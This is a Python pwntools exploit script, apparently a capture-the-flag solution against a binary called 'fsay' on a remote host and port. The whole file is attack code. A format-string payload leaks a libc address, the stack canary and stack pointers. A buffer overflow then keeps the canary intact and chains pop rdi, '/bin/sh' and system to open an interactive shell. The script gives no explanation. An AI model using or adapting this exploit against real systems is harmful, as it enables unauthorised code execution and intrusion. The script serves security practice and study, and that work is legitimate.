#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import time

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './fsay'
elf = ELF(exe)
HOST = '188.166.173.208'
PORT = 30952

if not args.REMOTE:
    libc = elf.libc
else:
    libc = ELF('./libc-2.27.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b main
b *warning + 257
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.recvuntil(b"food")
p.sendline(b"1")
p.recvuntil(b"rocks)")
p.sendline(b"2")
p.recvuntil(b"nite?")
payload = b"%25$lx %13$lx %15$lx %1$lx" #libc_start_main+242, canary, ret_addr, stack_leak
p.sendline(payload)

resp = p.recvuntil(b"food")
libc_start_main_242, canary, ret_addr, stack_leak = resp.split()[0:4]
if args.REMOTE:
    libc.address = int(libc_start_main_242,16) - 0x021b97
else: 
    libc.address = int(libc_start_main_242,16) - 0x028cb2
canary = int(canary,16)
bin_base = int(ret_addr,16) - 0x174a 
ret_addr = int(stack_leak,16) + 0x38

log.info(f"canary: {canary}")
log.info(f"binary base: {hex(bin_base)}")
log.info(f"libc base: {hex(libc.address)}")

systemPlt = libc.symbols['system']
pop_rdi = bin_base + 0x18bb
ret_pad = bin_base + 0x1016
bin_sh = next(libc.search(b'/bin/sh'))

for i in range(8):
    p.sendline(b"1")
    p.recvuntil(b"rocks)")
    p.sendline(b"2")
    p.recvuntil(b"nite?")
    p.sendline(b"a")
    if i == 7:
        break
    p.recvuntil(b"food")
p.recvuntil(b"it?")

payload = b"A" * 24
payload += p64(canary)
payload += b"B" * 8
payload += p64(ret_pad)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(systemPlt)
p.sendline(payload)
p.interactive()

